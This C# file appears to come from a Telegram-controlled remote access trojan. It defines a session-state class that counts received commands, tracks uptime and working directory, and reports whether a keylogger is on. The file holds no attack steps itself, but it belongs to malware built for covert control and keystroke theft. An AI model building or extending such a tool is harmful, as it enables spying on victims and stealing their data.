namespace TelegramRAT.Core;

internal sealed class SessionState
{
    public string? LastCommand { get; set; }
    public DateTime LastActivity { get; set; } = DateTime.UtcNow;
    public DateTime StartTime { get; } = DateTime.UtcNow;
    public int CommandsProcessed { get; set; }
    public bool KeyloggerActive { get; set; }
    public string? CurrentWorkingDirectory { get; set; } = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

    public TimeSpan Uptime => DateTime.UtcNow - StartTime;

    public string GetStatusReport() =>
        $"Uptime: {Uptime:hh\\:mm\\:ss}\n" +
        $"Commands: {CommandsProcessed}\n" +
        $"Last: {LastCommand ?? "none"}\n" +
        $"Keylogger: {(KeyloggerActive ? "ON" : "OFF")}";
}
